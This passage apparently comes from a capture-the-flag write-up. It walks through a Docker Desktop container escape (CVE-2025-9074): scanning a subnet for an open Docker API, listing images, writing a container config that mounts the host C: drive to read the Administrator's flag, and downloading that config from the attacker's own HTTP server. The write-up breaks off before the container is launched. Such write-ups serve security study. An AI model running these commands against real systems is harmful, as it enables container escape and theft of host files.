Root Flag

Privilege Escalation (CVE-2025-9074)

It turns out that we’re inside a Docker container with restricted privileges. The root flag is on the host system which means we have to escape the container to access it.

The endpoint according to the CVE is 192.168.65.7:2375 , so we try host.docker.internal, which is a special DNS name that Docker Desktop uses to access the host from inside containers:

we weren’t able to get a connection but based on the error, at least we were able to get an IP address: 192.168.65.254

host.docker.internal points to 192.168.65.254 but we couldn’t get get a connection so we can check other IP addresses in the subnet using the following script:

for i in $(seq 1 254); do (curl -s --connect-timeout 1 http://192.168.65.$i:2375/version 2>/dev/null | grep -q "ApiVersion" && echo "192.168.65.$i:2375 OPEN") & done; wait

we get a hit. The Docker API is open on 192.168.65.7.

Enumerate Docker Images

curl -s http://192.168.65.7:2375/images/json

we go back to our host machine and create a container configuration with host filesystem mounted, we can create it in the file /tmp/container.json .

{
  "Image": "alpine:latest",
  "Cmd": ["/bin/sh", "-c", "cat /mnt/host_root/Users/Administrator/Desktop/root.txt"],
  "HostConfig": {
    "Binds": ["/mnt/host/c:/mnt/host_root"]
  },
  "Tty": true,
  "OpenStdin": true
}

Next we start a http server using python:

cd /tmp
python -m http.server 8000

Then we return to the container and we download the payload:

curl http://<our-IP>:8000/container.json -o /tmp/container.json
